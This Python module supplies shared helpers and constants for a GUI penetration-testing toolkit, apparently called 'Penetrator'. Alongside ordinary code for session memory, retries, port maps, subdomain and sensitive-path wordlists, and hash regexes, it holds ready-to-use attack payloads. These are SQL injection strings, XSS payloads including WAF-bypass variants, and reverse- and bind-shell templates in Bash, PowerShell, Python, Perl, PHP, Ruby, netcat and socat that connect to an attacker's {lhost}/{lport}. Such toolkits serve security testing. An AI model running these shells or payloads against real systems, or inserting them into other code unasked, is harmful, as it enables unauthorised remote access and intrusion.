"""Pure-logic helpers used by GUI tool frames.

These functions don't print or prompt - they take inputs and call the provided
``log(msg, tag)`` callback. That makes them trivial to wire into any UI.
"""
from __future__ import annotations

import base64
import hashlib
import html as html_mod
import itertools
import re
import secrets
import socket
import string
import struct
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Callable
from collections.abc import Iterable

Logger = Callable[..., None]  # log(msg, tag=...)

# __all__ must include underscore helpers that sub-modules rely on,
# because wildcard import skips names starting with '_' by default.
__all__ = [
    # stdlib re-exports (sub-modules use these without re-importing)
    "base64", "hashlib", "html_mod", "itertools", "re", "secrets", "socket",
    "string", "struct", "time", "urllib",
    "ThreadPoolExecutor", "as_completed", "Path", "Callable", "Iterable",
    # types
    "Logger",
    # cancellation
    "_stop_check", "set_stop_check", "_should_stop",
    # session
    "_session_lock", "_session",
    "session_get", "session_set", "session_dump", "session_restore",
    # config
    "REQUEST_TIMEOUT", "TLS_VERIFY", "MAX_RETRIES",
    # retry helper
    "_retry",
    # UA
    "UA_POOL", "random_ua",
    # constants
    "COMMON_SERVICES", "COMMON_SUBDOMAINS", "DEFAULT_WEB_PATHS",
    "SECURITY_HEADERS", "HASH_SIGNATURES", "SUPPORTED_HASH_ALGOS",
    "SQL_PAYLOADS", "SQL_ERROR_SIGNATURES",
    "XSS_PAYLOADS_BASIC", "XSS_PAYLOADS_POLYGLOT", "XSS_PAYLOADS_WAF",
    "REVERSE_SHELL_TEMPLATES", "BIND_SHELL_TEMPLATES",
    "MAGIC_SIGNATURES", "USERNAME_SITES", "LEET_MAP",
    "EMAIL_REGEX", "DELIMITER",
]

# Module-level cancellation hook (set by TaskRunner before each run).
# Engine functions can call _should_stop() inside long loops.
import threading as _threading

_stop_check: Callable[[], bool] | None = None


def set_stop_check(fn: Callable[[], bool] | None) -> None:
    """Install a callable that returns True when the user requested stop."""
    global _stop_check
    _stop_check = fn


def _should_stop() -> bool:
    """Return True if the user has requested cancellation."""
    return _stop_check() if _stop_check is not None else False


# Cross-tool memory: last scan / discovery results, accessible to "chain" tools.
# Protected by a lock for thread-safe access across concurrent API requests.
_session_lock = _threading.Lock()
_session: dict[str, object] = {
    "last_target": None,
    "last_open_ports": [],
    "last_subdomains": [],
    "last_buster_paths": [],
}


def session_get(key: str, default=None) -> object:
    """Retrieve a value from the cross-tool session memory (thread-safe)."""
    with _session_lock:
        return _session.get(key, default)


def session_set(key: str, value) -> None:
    """Store a value in the cross-tool session memory (thread-safe)."""
    with _session_lock:
        _session[key] = value


def session_dump() -> dict:
    """Snapshot the cross-tool memory (used by the workspace save feature)."""
    import copy
    with _session_lock:
        return copy.deepcopy(_session)


def session_restore(snapshot: dict) -> None:
    """Restore session memory from a previously saved snapshot."""
    if isinstance(snapshot, dict):
        with _session_lock:
            _session.update(snapshot)

# ---------------------------------------------------------------------------
# Global configuration (overridable via environment or programmatically)
# ---------------------------------------------------------------------------
import os as _os

# Default request timeout for HTTP calls (seconds)
REQUEST_TIMEOUT: float = float(_os.environ.get("PENETRATOR_TIMEOUT", "10"))

# TLS certificate verification: True = verify (safe), False = skip (for self-signed targets)
TLS_VERIFY: bool = _os.environ.get("PENETRATOR_TLS_VERIFY", "1") not in ("0", "false", "no")

# Maximum HTTP retry attempts for transient failures
MAX_RETRIES: int = int(_os.environ.get("PENETRATOR_MAX_RETRIES", "2"))


# ---------------------------------------------------------------------------
# Retry helper — exponential backoff for transient HTTP errors
# ---------------------------------------------------------------------------
def _retry(fn, *args, retries: int | None = None, **kwargs):
    """Call *fn* with retry on ConnectionError / Timeout.

    Uses exponential backoff (0.5s, 1s, 2s…).  Returns the first
    successful result or re-raises the last exception.
    """
    max_tries = (retries if retries is not None else MAX_RETRIES) + 1
    import requests as _req
    for attempt in range(max_tries):
        try:
            return fn(*args, **kwargs)
        except (_req.ConnectionError, _req.Timeout):
            if attempt == max_tries - 1:
                raise
            time.sleep(0.5 * (2 ** attempt))


# ---------------------------------------------------------------------------
# User-Agent Rotation (early definition so all functions can use random_ua())
# ---------------------------------------------------------------------------
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "curl/8.7.1",
    "python-requests/2.32.0",
    "Wget/1.21.4",
    "PostmanRuntime/7.38.0",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15",
]


def random_ua() -> str:
    """Return a random User-Agent from the pool."""
    return secrets.choice(UA_POOL)


# ---------------------------------------------------------------------------
# Constants (shared with CLI modules)
# ---------------------------------------------------------------------------
COMMON_SERVICES = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
    80: "http", 110: "pop3", 135: "msrpc", 139: "netbios", 143: "imap",
    443: "https", 445: "smb", 465: "smtps", 587: "submission", 993: "imaps",
    995: "pop3s", 1433: "mssql", 1521: "oracle", 3306: "mysql", 3389: "rdp",
    5432: "postgresql", 5900: "vnc", 6379: "redis", 8080: "http-alt",
    8443: "https-alt", 27017: "mongodb",
}

COMMON_SUBDOMAINS = [
    "www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "ns2", "webdisk",
    "admin", "forum", "blog", "login", "api", "dev", "test", "stage", "m",
    "mobile", "shop", "store", "status", "static", "cdn", "assets", "img",
    "images", "download", "downloads", "docs", "help", "support", "portal",
    "vpn", "remote", "cpanel", "secure", "server", "git", "gitlab", "jenkins",
    "grafana", "kibana", "beta", "demo", "staging", "app", "apps", "intranet",
    "news", "media", "video", "chat", "monitor", "jira", "wiki", "sso",
]

DEFAULT_WEB_PATHS = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php",
    "wp-content", "wp-includes", "config.php", "config.bak", "config.old",
    "backup", "backup.zip", "backup.tar.gz", ".git", ".git/config", ".env",
    ".htaccess", ".htpasswd", "robots.txt", "sitemap.xml", "phpinfo.php",
    "phpmyadmin", "server-status", "test.php", "info.php", "setup.php",
    "install.php", "shell.php", "upload", "uploads", "images", "assets",
    "api", "api/v1", "api/v2", "users", "user", "profile", "dashboard",
    "console", "manage", "panel", "cpanel", "webmail", "mail",
    "backup.sql", "database.sql", "db.sql", "dump.sql",
    "README.md", "LICENSE", "package.json", "composer.json",
    "debug", "phpmyadmin/index.php", "adminer.php",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": "Enforces HTTPS",
    "Content-Security-Policy": "Restricts resource origins",
    "X-Frame-Options": "Anti-clickjacking",
    "X-Content-Type-Options": "MIME sniffing protection",
    "Referrer-Policy": "Controls Referer header",
    "Permissions-Policy": "Browser feature permissions",
    "X-XSS-Protection": "Legacy XSS filter",
}

HASH_SIGNATURES: list[tuple[str, re.Pattern[str]]] = [
    ("MD5",            re.compile(r"^[a-f0-9]{32}$", re.I)),
    ("SHA-1",          re.compile(r"^[a-f0-9]{40}$", re.I)),
    ("SHA-224",        re.compile(r"^[a-f0-9]{56}$", re.I)),
    ("SHA-256",        re.compile(r"^[a-f0-9]{64}$", re.I)),
    ("SHA-384",        re.compile(r"^[a-f0-9]{96}$", re.I)),
    ("SHA-512",        re.compile(r"^[a-f0-9]{128}$", re.I)),
    ("NTLM",           re.compile(r"^[a-f0-9]{32}$", re.I)),
    ("bcrypt",         re.compile(r"^\$2[abxy]\$\d+\$.{53}$")),
    ("Argon2",         re.compile(r"^\$argon2(id|i|d)\$")),
    ("SHA-512 crypt",  re.compile(r"^\$6\$")),
    ("SHA-256 crypt",  re.compile(r"^\$5\$")),
    ("MD5 crypt",      re.compile(r"^\$1\$")),
    ("MySQL 4.1+",     re.compile(r"^\*[A-F0-9]{40}$")),
]

SUPPORTED_HASH_ALGOS = ("md5", "sha1", "sha224", "sha256", "sha384", "sha512")

SQL_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1-- -",
    "\" OR \"1\"=\"1", "') OR ('1'='1", "' UNION SELECT NULL-- ",
    "admin' -- ",
]
SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax", "warning: mysql",
    "unclosed quotation mark", "quoted string not properly terminated",
    "pg_query()", "pg::syntaxerror", "sqlite3::", "ora-00933", "ora-00921",
    "microsoft odbc", "microsoft sql server", "sqlstate", "odbc driver",
]

XSS_PAYLOADS_BASIC = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
]
XSS_PAYLOADS_POLYGLOT = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "\"><img src=x onerror=alert(1)>",
    "</script><svg/onload=alert(1)>",
]
XSS_PAYLOADS_WAF = [
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<ScRipT>alert(1)</sCrIpT>",
    "<img src=x oneonerrorrror=alert(1)>",
    "<math><brute href=javascript:alert(1)>X</brute>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
]

REVERSE_SHELL_TEMPLATES = {
    "Bash":          'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
    "PowerShell":    '$c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$out=(Invoke-Expression $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($out);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()',
    "Python (nix)":  'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])',
    "Python (win)":  'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["cmd.exe"])',
    "Perl":          'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
    "PHP":           'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    "Ruby":          'ruby -rsocket -e\'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    "Netcat (mkfifo)": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
    "Socat":         'socat tcp-connect:{lhost}:{lport} exec:bash,pty,stderr,setsid,sigint,sane',
}

BIND_SHELL_TEMPLATES = {
    "nc (Linux)":   'nc -lvp {lport} -e /bin/bash',
    "nc (Windows)": 'nc -lvp {lport} -e cmd.exe',
    "ncat":         'ncat -lvp {lport} -e /bin/bash',
    "Python":       'python -c \'import socket,subprocess,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{lport}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])\'',
    "Perl":         'perl -e \'use Socket;$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in($p,INADDR_ANY));listen(S,5);while(1){{accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");}}\'',
}

MAGIC_SIGNATURES: list[tuple[bytes, str]] = [
    (b"\x89PNG\r\n\x1a\n",        "PNG image"),
    (b"\xFF\xD8\xFF",              "JPEG image"),
    (b"GIF87a",                    "GIF image (87a)"),
    (b"GIF89a",                    "GIF image (89a)"),
    (b"BM",                        "BMP image"),
    (b"%PDF",                      "PDF document"),
    (b"PK\x03\x04",                "ZIP / OOXML / JAR"),
    (b"Rar!\x1a\x07\x00",          "RAR v1.5+"),
    (b"Rar!\x1a\x07\x01\x00",      "RAR v5+"),
    (b"\x1f\x8b\x08",              "GZIP"),
    (b"7z\xBC\xAF\x27\x1C",        "7-Zip"),
    (b"MZ",                        "Windows PE executable"),
    (b"\x7FELF",                   "Linux ELF executable"),
    (b"\xCA\xFE\xBA\xBE",          "Java class / Mach-O FAT"),
    (b"\xFE\xED\xFA\xCE",          "Mach-O (32-bit)"),
    (b"\xFE\xED\xFA\xCF",          "Mach-O (64-bit)"),
    (b"SQLite format 3\x00",       "SQLite database"),
    (b"ID3",                       "MP3 (ID3)"),
    (b"OggS",                      "OGG"),
    (b"RIFF",                      "RIFF (WAV/AVI)"),
    (b"fLaC",                      "FLAC audio"),
]

USERNAME_SITES: dict[str, str] = {
    "GitHub":     "https://github.com/{u}",
    "GitLab":     "https://gitlab.com/{u}",
    "Twitter/X":  "https://x.com/{u}",
    "Instagram":  "https://www.instagram.com/{u}/",
    "Reddit":     "https://www.reddit.com/user/{u}",
    "Medium":     "https://medium.com/@{u}",
    "DevTo":      "https://dev.to/{u}",
    "Hashnode":   "https://hashnode.com/@{u}",
    "HackerNews": "https://news.ycombinator.com/user?id={u}",
    "HackerOne":  "https://hackerone.com/{u}",
    "Bugcrowd":   "https://bugcrowd.com/{u}",
    "Twitch":     "https://www.twitch.tv/{u}",
    "YouTube":    "https://www.youtube.com/@{u}",
    "TikTok":     "https://www.tiktok.com/@{u}",
    "Keybase":    "https://keybase.io/{u}",
    "Steam":      "https://steamcommunity.com/id/{u}",
    "StackOverflow": "https://stackoverflow.com/users/{u}",
    "SoundCloud": "https://soundcloud.com/{u}",
    "Vimeo":      "https://vimeo.com/{u}",
    "Pinterest":  "https://www.pinterest.com/{u}/",
}

LEET_MAP = {
    "a": ["a", "A", "4", "@"], "b": ["b", "B", "8"], "e": ["e", "E", "3"],
    "g": ["g", "G", "9"], "i": ["i", "I", "1", "!"], "l": ["l", "L", "1"],
    "o": ["o", "O", "0"], "s": ["s", "S", "5", "$"], "t": ["t", "T", "7"],
    "z": ["z", "Z", "2"],
}

EMAIL_REGEX = re.compile(r"^[A-Za-z0-9._%+-]+@([A-Za-z0-9.-]+\.[A-Za-z]{2,})$")
DELIMITER = "<<<PEN_END>>>"


